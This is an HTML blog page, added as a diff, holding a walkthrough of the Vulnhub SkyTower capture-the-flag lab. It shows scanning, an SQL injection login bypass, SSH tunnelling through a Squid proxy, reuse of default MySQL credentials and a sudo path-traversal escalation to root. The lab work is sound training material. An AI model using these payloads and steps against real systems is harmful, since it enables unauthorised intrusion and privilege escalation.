@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Vulnhub - SkyTower Writeup &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">Vulnhub - SkyTower Writeup</h1>
+          <p class="post-date">Posted <time datetime="2019-06-05">Jun 5, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="download-here">Download here</h1>
+
+<p>Target VM: <a href="https://download.vulnhub.com/skytower/SkyTower.zip">https://download.vulnhub.com/skytower/SkyTower.zip</a></p>
+
+<p>Difficulty: Intermediate to Advanced</p>
+
+<p>Welcome to SkyTower!</p>
+
+<p>This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town).</p>
+
+<p>You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them.</p>
+
+<p>You will most likely find that automated tools will not assist you.</p>
+
+<h1 id="before-start">Before Start</h1>
+
+<p>After you download it, just import to your VMWare workstation and change the network interface type as you pleased. Network is configured via DHCP.</p>
+
+<p>Prepare your Kali and ensure they are in the same subnet.</p>
+
+<p>Open VMware workstation - Edit - Virtual network editor to get the ip range.</p>
+
+<h2 id="check-vm-ip">Check VM IP</h2>
+
+<p><code>nmap -sn -n 172.16.51.0/24</code>, found: 172.16.51.133</p>
+
+<h1 id="gogogo">GOGOGO</h1>
+
+<h2 id="before-attack">Before Attack</h2>
+
+<p><code>nmap -A -Pn -p1-65535 -O -oN skytower-nmap 172.16.51.133</code> Found 80,3128.</p>
+
+<p>Port 22 for SSH is filtered But you got Port 3128 with Squid, so you may need to use the proxy to connect to 22.</p>
+
+<p><code>nikto -output $(pwd)/skytower.nikto.txt -host 172.16.51.133 port 80</code> Found <code>login.php</code> So, this is the only result we found.</p>
+
+<h2 id="start-attack">Start Attack</h2>
+
+<p>Walk through <a href="http://172.16.51.133">http://172.16.51.133</a>, A login form without any hint.</p>
+
+<h3 id="sql-injection">SQL Injection</h3>
+
+<p>So let&rsquo;s try SQL injection here, Let&rsquo;s review some background:</p>
+
+<ul>
+<li>SQL sequences allowed you do logical operation</li>
+<li>SQL comment delimiter is: <code>--</code> or <code>#</code> (MySQL) or <code>/* */</code> (Multi-line)</li>
+</ul>
+
+<p>So, firstly, try <code>' or 1=1 --</code>, you got the SQL Exception and got <code>11</code>, it tells me some keywords <strong>MUST</strong> be blocked and the user input is escaped in some way.</p>
+
+<p>Common ways to bypass those limitations are encoded with Unicode or URL, however, encoding in this way will produce <code>#</code> or <code>;</code>, This is not working here.</p>
+
+<p>Let&rsquo;s try to replace some chars, just replace <code>or</code> with <code>||</code> and <code>--</code> with <code>#</code>.</p>
+
+<p>Duang! It works.</p>
+
+<h3 id="after-sql-injection">After SQL Injection</h3>
+
+<p>You found a login page, it told you to login via SSH with credentials.</p>
+
+<p>Credentials on the webpage: <code>john:hereisjohn</code></p>
+
+<p>Login should work with proxy port 3128.</p>
+
+<p>In order to connect to SSH via HTTP proxy, you need a software called <code>proxytunnel</code>, <code>sudo proxytunnel -p 172.16.51.133:3128 -d 127.0.0.1:22 -a 13322 -v</code>, then <code>ssh john@127.0.0.1 -p13322 -v</code>.</p>
+
+<h3 id="modify-bashrc">Modify bashrc</h3>
+
+<p>After login with correct credentials, you immediately get logged out. This usually caused by incorrect default login shell or incorrect shell config. So just pass a param to bypass it, <code>ssh -p13322 john@127.0.0.1 /bin/bash</code>.</p>
+
+<p>You will get an empty shell here: <code>cat ~/.bashrc</code>, you will found the last line is a fucking <code>exit</code>. Run <code>sed -i '$ d' ~/.bashrc</code> to remove last line in <code>~/.bashrc</code>. Now, just Ctrl-C to interrupt and reconnect. You will get a full-featured shell.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Run LinEnum.sh to check it rapidly. After LinEnum.sh, you found that <code>Linux version 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2</code> AND ALSO <code>[+] We can connect to the local MYSQL service with default root/root credentials!</code></p>
+
+<p>So SQL Enumerate Users:</p>
+
+<pre><code class="language-MySQL">show databases;
+use SkyTech;
+show tables;
+select * from login;
+</code></pre>
+
+<p>try to login with each user listed and use <code>sudo -l</code> to check if you can get root.</p>
+
+<p>Well, the only user you are able to login here, except john, is: <code>sara:ihatethisjob</code>.</p>
+
+<p>However, same trick on bashrc applied here. Repeat the step above.</p>
+
+<p>BUT with <code>sudo -l</code>, you&rsquo;ll be disappointed:</p>
+
+<pre><code>Matching Defaults entries for sara on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sara may run the following commands on this host:
+    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+</code></pre>
+
+<p>So, you may use <code>../</code> to escalate it.</p>
+
+<pre><code class="language-bash">sara@SkyTower:~$ sudo bash
+[sudo] password for sara: 
+Sorry, user sara is not allowed to execute '/bin/bash' as root on SkyTower.local.
+sara@SkyTower:~$ sudo ls /accounts/../root/
+flag.txt
+sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+sara@SkyTower:~$ su root
+Password: theskytower
+root@SkyTower:/home/sara# cd &amp;&amp; ls
+flag.txt
+</code></pre>
+
+<p>Congrats! ALL DONE!</p>
+
+<p>(FINISHED)</p>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/welovecode/vulnhub-mrrobot/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">Vulnhub - Mr.Robot Writeup</h2>
+    <p class="card-text"></p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-06-05 65:00">Jun 5, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
